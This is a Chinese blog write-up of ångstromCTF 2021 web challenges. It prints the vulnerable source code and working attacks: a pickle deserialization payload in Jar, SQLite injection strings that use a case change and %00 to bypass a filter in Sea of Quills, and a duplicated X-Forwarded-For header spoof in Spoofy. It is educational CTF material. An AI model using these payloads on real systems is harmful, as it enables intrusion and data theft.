+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Jar（复现）"><a href="#Jar（复现）" class="headerlink" title="Jar（复现）"></a>Jar（复现）</h3><p>题目给了源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, request, make_response, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">'FLAG'</span>, <span class="string">'actf&#123;FAKE_FLAG&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/pickle.jpg')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bg</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> send_file(<span class="string">'pickle.jpg'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jar</span><span class="params">()</span>:</span></span><br><span class="line">	contents = request.cookies.get(<span class="string">'contents'</span>)</span><br><span class="line">	<span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line">	<span class="keyword">else</span>: items = []</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'&lt;form method="post" action="/add" style="text-align: center; width: 100%"&gt;&lt;input type="text" name="item" placeholder="Item"&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style="width: 100%; height: 100%" src="/pickle.jpg"&gt;'</span> + \</span><br><span class="line">		<span class="string">''</span>.join(<span class="string">f'&lt;div style="background-color: white; font-size: 3em; position: absolute; top: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%; left: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%;"&gt;<span class="subst">&#123;item&#125;</span>&lt;/div&gt;'</span> <span class="keyword">for</span> item <span class="keyword">in</span> items)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/add', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">	contents = request.cookies.get(<span class="string">'contents'</span>)</span><br><span class="line">	<span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line">	<span class="keyword">else</span>: items = []</span><br><span class="line">	items.append(request.form[<span class="string">'item'</span>])</span><br><span class="line">	response = make_response(redirect(<span class="string">'/'</span>))</span><br><span class="line">	response.set_cookie(<span class="string">'contents'</span>, base64.b64encode(pickle.dumps(items)))</span><br><span class="line">	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">app.run(threaded=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>通过审计可以发现<code>import pickle</code>，因此可以揣摩是python的反序列化。临时，找了一篇文章：</p>
+<p><a href="https://www.freebuf.com/articles/web/252189.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/252189.html</a></p>
+<p>来学习了解python里的反序列化利用。</p>
+<p>但自己在做题时踩一个坑：</p>
+<p><code>if contents: items = pickle.loads(base64.b64decode(contents))
+    else: items = []</code></p>
+<p><code>items=[]</code>代表返回值为NULL但是<code>items</code>的类型应该还是为<code>list</code>因此我们在构筑payload时应该让其<code>pickle.loads</code>后的类型为<code>list</code>。</p>
+<p>写个脚本构造exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.getenv, (<span class="string">'FLAG'</span>,))</span><br><span class="line"></span><br><span class="line">pickled = pickle.dumps([RCE()])<span class="comment">#注意是个list类型</span></span><br><span class="line">print(base64.b64encode(pickled).decode())</span><br></pre></td></tr></table></figure>
+
+<p>得到payload转包篡改cookie。</p>
+<p><img src="image-20210411143557147.png" alt="image-20210411143557147"></p>
+<p>得到flag：</p>
+<p><img src="image-20210411143808124.png" alt="image-20210411143808124"></p>
+<p>最后提下，os.getenv可以获得环境变量里的参数。</p>
+<p><img src="image-20210411143857541.png" alt="image-20210411143857541"></p>
+<h3 id="Sea-of-Quills（复现）"><a href="#Sea-of-Quills（复现）" class="headerlink" title="Sea of Quills（复现）"></a>Sea of Quills（复现）</h3><p>这题也给了源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="built_in">require</span> <span class="string">'sqlite3'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> :bind, "0.0.0.0"</span><br><span class="line"><span class="keyword">set</span> :port, 4567</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/' do</span><br><span class="line">	db = SQLite3::Database.new "quills.db"</span><br><span class="line">	@row = db.execute( "select * from quills" )</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	erb :index</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/quills' do</span><br><span class="line">	erb :quills	</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post '/quills' do</span><br><span class="line">	db = SQLite3::Database.new "quills.db"</span><br><span class="line">	cols = params[:cols]</span><br><span class="line">	lim = params[:limit]</span><br><span class="line">	off = params[:offset]</span><br><span class="line">	</span><br><span class="line">	blacklist = ["-", "/", ";", "'", "\""]</span><br><span class="line">	</span><br><span class="line">	blacklist.each &#123; |word|</span><br><span class="line">		<span class="keyword">if</span> cols.include? word</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">		end</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) || !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line">	end</span><br><span class="line"></span><br><span class="line">	@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br><span class="line"></span><br><span class="line">	p @row</span><br><span class="line"></span><br><span class="line">	erb :specific</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>经过查阅发现是js写的sql查询，其中在’/quills’处没有对我们输入的cols参数进行过滤。</p>
+<p>但做题时，还是技差一筹，百度了<code>sqlite3</code>是js操控Sql一种库，但忘了深入了解SQLite 跟MYSQL一样是一种数据库软件。(默认当sql来做然后原地卒…..)</p>
+<p>于是经过查询查阅资料发现：</p>
+<blockquote>
+<p>SQLite数据库中有一个内置表，名为SQLITE_MASTER，此表中存储着当前数据库中所有表的相关信息，比如表的名称、用于创建此表的sql语句、索引、索引所属的表、创建索引的sql语句等。每一个 SQLite 数据库都有一个叫 SQLITE_MASTER 的表， 它定义数据库的模式。 </p>
+<p>SQLITE_MASTER的表结构：</p>
+<p>CREATE TABLE sqlite_master ( </p>
+<p>type TEXT, </p>
+<p>name TEXT, </p>
+<p>tbl_name TEXT, </p>
+<p>rootpage INTEGER, </p>
+<p>sql TEXT );<br>原文链接：<a href="https://blog.csdn.net/qq_32572085/article/details/91407057" target="_blank" rel="noopener">https://blog.csdn.net/qq_32572085/article/details/91407057</a></p>
+</blockquote>
+<p>因此我们可以构造payload：</p>
+<p><code>cols=sql from sqlite_master union all select desc</code></p>
+<p>来看数据库中所有表的信息。</p>
+<p><img src="image-20210411153853754.png" alt="image-20210411153853754"></p>
+<p>发现<code>CREATE TABLE flagtable (flag varchar(30))</code> 于是查询flagtable。</p>
+<p><img src="image-20210411154011337.png" alt="image-20210411154011337"></p>
+<h3 id="Sea-of-Quills（复现）-1"><a href="#Sea-of-Quills（复现）-1" class="headerlink" title="Sea of Quills（复现）"></a>Sea of Quills（复现）</h3><p>这题较上一题多增加了限制：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="built_in">require</span> <span class="string">'sqlite3'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> :server, :puma</span><br><span class="line"><span class="keyword">set</span> :bind, "0.0.0.0"</span><br><span class="line"><span class="keyword">set</span> :port, 4567</span><br><span class="line"><span class="keyword">set</span> :environment, :production</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/' do</span><br><span class="line">	db = SQLite3::Database.new "quills.db"</span><br><span class="line">	@row = db.execute( "select * from quills" )</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	erb :index</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/quills' do</span><br><span class="line">	erb :quills	</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post '/quills' do</span><br><span class="line">	db = SQLite3::Database.new "quills.db"</span><br><span class="line">	cols = params[:cols]</span><br><span class="line">	lim = params[:limit]</span><br><span class="line">	off = params[:offset]</span><br><span class="line">	</span><br><span class="line">	blacklist = ["-", "/", ";", "'", "\"", "flag"]</span><br><span class="line">	</span><br><span class="line">	blacklist.each &#123; |word|</span><br><span class="line">		<span class="keyword">if</span> cols.include? word</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">		end</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> cols.length &gt; <span class="number">24</span> || !<span class="regexp">/^[0-9]+$/</span>.match?(lim) || !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line">	end</span><br><span class="line"></span><br><span class="line">	@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br><span class="line"></span><br><span class="line">	p @row</span><br><span class="line"></span><br><span class="line">	erb :specific</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>限制了<code>flag</code>字符的出现和cols的长度。</p>
+<p>但经过参考lao的wp发现：</p>
+<p>大小写可以绕过flag检测，%00有类似mysql中<code>#</code>的作用。</p>
+<p>参考网址：<a href="https://ctftime.org/task/15344" target="_blank" rel="noopener">https://ctftime.org/task/15344</a></p>
+<p>于是构造payload：<code>cols=* from Flagtable%00</code></p>
+<p><img src="image-20210411160349101.png" alt="image-20210411160349101"></p>
+<h3 id="Spoofy（复现）"><a href="#Spoofy（复现）" class="headerlink" title="Spoofy（复现）"></a>Spoofy（复现）</h3><p>题目源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"></span><br><span class="line">FLAG: str = os.environ.get(<span class="string">"FLAG"</span>) <span class="keyword">or</span> <span class="string">"flag&#123;fake_flag&#125;"</span></span><br><span class="line"><span class="keyword">with</span> open(__file__, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    SOURCE: str = f.read()</span><br><span class="line"></span><br><span class="line">app: Flask = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text_response</span><span class="params">(body: str, status: int = <span class="number">200</span>, **kwargs)</span> -&gt; Response:</span></span><br><span class="line">    <span class="keyword">return</span> Response(body, mimetype=<span class="string">"text/plain"</span>, status=status, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/source")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_source</span><span class="params">()</span> -&gt; Response:</span></span><br><span class="line">    <span class="keyword">return</span> text_response(SOURCE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_page</span><span class="params">()</span> -&gt; Response:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"X-Forwarded-For"</span> <span class="keyword">in</span> request.headers:</span><br><span class="line">        <span class="comment"># https://stackoverflow.com/q/18264304/</span></span><br><span class="line">        <span class="comment"># Some people say first ip in list, some people say last</span></span><br><span class="line">        <span class="comment"># I don't know who to believe</span></span><br><span class="line">        <span class="comment"># So just believe both</span></span><br><span class="line">        ips: List[str] = request.headers[<span class="string">"X-Forwarded-For"</span>].split(<span class="string">", "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ips:</span><br><span class="line">            <span class="keyword">return</span> text_response(<span class="string">"How is it even possible to have 0 IPs???"</span>, <span class="number">400</span>)</span><br><span class="line">        <span class="keyword">if</span> ips[<span class="number">0</span>] != ips[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> text_response(</span><br><span class="line">                <span class="string">"First and last IPs disagree so I'm just going to not serve this request."</span>,</span><br><span class="line">                <span class="number">400</span>,</span><br><span class="line">            )</span><br><span class="line">        ip: str = ips[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> ip != <span class="string">"1.3.3.7"</span>:</span><br><span class="line">            <span class="keyword">return</span> text_response(<span class="string">"I don't trust you &gt;:("</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> text_response(<span class="string">"Hello 1337 haxx0r, here's the flag! "</span> + FLAG)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> text_response(<span class="string">"Please run the server through a proxy."</span>, <span class="number">400</span>)</span><br></pre></td></tr></table></figure>
+
+<p>根据审阅代码及提示,发现是X-Forwarded-For伪造.但是题目对”X-Forwarded-For”每一个参数都进行了处理我们单纯改会抱错.来自<a href="https://stackoverflow.com/questions/18264304/get-clients-real-ip-address-on-heroku所提到,我们手改X-Forwarded-For头包里依然会加上我们的正式地址" target="_blank" rel="noopener">https://stackoverflow.com/questions/18264304/get-clients-real-ip-address-on-heroku所提到,我们手改X-Forwarded-For头包里依然会加上我们的正式地址</a>.</p>
+<p><img src="image-20210412154952876.png" alt="image-20210412154952876"></p>
+<p>因此我们可以利用不同中间件处理http策略不同的特性.构造两个X-Forwarded-For:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:1.3.3.7</span><br><span class="line">X-Forwarded-For: 1.1.1.1, 1.3.3.7</span><br></pre></td></tr></table></figure>
+
+<p>从而绕过得到flag。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/04/08/actf--wp/">ångstromCTF 2021--wp与复现记</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
+        <p><span>发布时间:</span>2021-04-08, 22:47:27</p>
+        <p><span>最后更新:</span>2021-04-12, 16:30:34</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/04/08/actf--wp/" title="ångstromCTF 2021--wp与复现记">lexsd6.github.io/2021/04/08/actf--wp/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/04/08/actf--wp/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/">
+                    从对b00k题目学习中初习off-by-one——学pwn小记(7)
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">
+                    修改ELF文件libc为指定版本
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tranquil"><span class="toc-text">tranquil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sanity-Checks"><span class="toc-text">Sanity Checks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stickystacks"><span class="toc-text">stickystacks</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jar（复现）"><span class="toc-text">Jar（复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sea-of-Quills（复现）"><span class="toc-text">Sea of Quills（复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sea-of-Quills（复现）-1"><span class="toc-text">Sea of Quills（复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spoofy（复现）"><span class="toc-text">Spoofy（复现）</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"ångstromCTF 2021--wp与复现记　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81NDYyMC8zMTA5MQ==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/" title="上一篇: 从对b00k题目学习中初习off-by-one——学pwn小记(7)">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/" title="下一篇: 修改ELF文件libc为指定版本">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/">解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/">Hunting— HTB  PWN  challenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/">xman的leve5另一种解法(mprotect)学习与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/">ctfshow-月饼杯2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/16/'could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!'%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/">\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/">5种字符'(^.9)'构造php_shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/17/ractf2021-pwn-ctf/">ractf2021-pwn-ctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">高版本libc(2.29-2.32) off by null利用姿势笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/26/2021qwb%20pwn%20wp/">2021qwb-pwn-初赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/28/ISCC2021%20PWN%20WP/">ISCC2021 PWN部分 WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/">ret2dl-resolve利用方法小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">系统调用与SROP方法学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/">pwn堆题泄露libc真实地址小tirck</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/">2021*CTF_PWN_babyheap复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/">关于格式化字符串利用——学pwn小记(9)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/">Tcache attack初学习——学pwn小记(8)</a></li><li class="post-list-item"><a class="post-list-link" 